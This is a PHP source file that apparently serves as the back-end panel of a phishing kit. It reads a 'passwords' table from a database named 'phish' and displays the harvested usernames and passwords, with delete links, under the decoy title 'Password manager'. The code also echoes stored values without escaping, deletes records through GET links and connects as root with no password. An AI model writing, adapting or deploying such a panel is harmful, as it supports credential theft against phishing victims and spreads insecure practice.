<?php
$connect=mysqli_connect('localhost','root','','phish');
session_start();
//check connection
if ($_SESSION['admin']=="yes") {
	# code...


if(mysqli_connect_error($connect))
{

	echo 'failed to connect!';
}

$sql="SELECT*FROM passwords";
$result=$connect->query($sql);

if (isset($_GET['logout'])) {
	session_destroy();
	header('location:index.php');
}
	?>
	<!DOCTYPE html>
	<html>
	<head>
		<link rel="stylesheet" type="text/css" href="bootstrap.css">

		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Password manager</title>
	</head>
	<body>
		<center>
		<style type="text/css">
		body{
			background-color: black;
			color: green;
			font-size: 20px;
		}
			th,td{
				border: 1px solid green;
				padding: 10px;
				border: 2px green dashed;
			}
			table{
				
			}
			button{
				 float: left;
			}
		</style>
<a href="?logout"><button>Logout</button></a>
	<table>
		<th>#</th>
	<th>User name</th>
	<th>Password</th>
	<th></th>
	<?php 
	$id=0;
	while ($row=mysqli_fetch_assoc($result)) {

			$id++;
	 ?>
	 <tr>
	 	<td><?php echo $id; ?></td>
	<td><?php echo $row['first_name']; ?></td>
	<td><?php echo $row['last_name']; ?></td>
	<td><a href="delete.php?id=<?php echo $row["id"]; ?>"><button>Delete</button></a></td>
</tr>
		<?php 
}
 ?>
	</table>
</center>
	</body>
	</html>
	<?php  
}
else{
	header('location:index.php');
}
?>